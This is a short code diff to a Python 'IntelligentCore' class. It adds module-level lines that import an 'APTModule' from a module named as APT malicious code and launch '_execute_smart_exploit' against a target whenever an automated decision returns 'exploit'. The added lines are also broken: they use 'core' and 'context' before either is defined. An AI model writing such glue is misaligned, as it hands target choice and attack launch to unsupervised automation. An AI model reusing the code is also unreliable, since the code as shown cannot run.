@@ -73,6 +73,13 @@ class IntelligentCore:
         else:
             self.genome['risk_tolerance'] = max(0.1, self.genome['risk_tolerance'] - 0.2)
 
+from APT恶意代码 import APTModule
+
+apt = APTModule()
+decision = core.make_decision(context)
+if decision['action'] == 'exploit':
+    apt._execute_smart_exploit(target=decision['target'])
+
 # 示例用法
 if __name__ == '__main__':
     core = IntelligentCore()
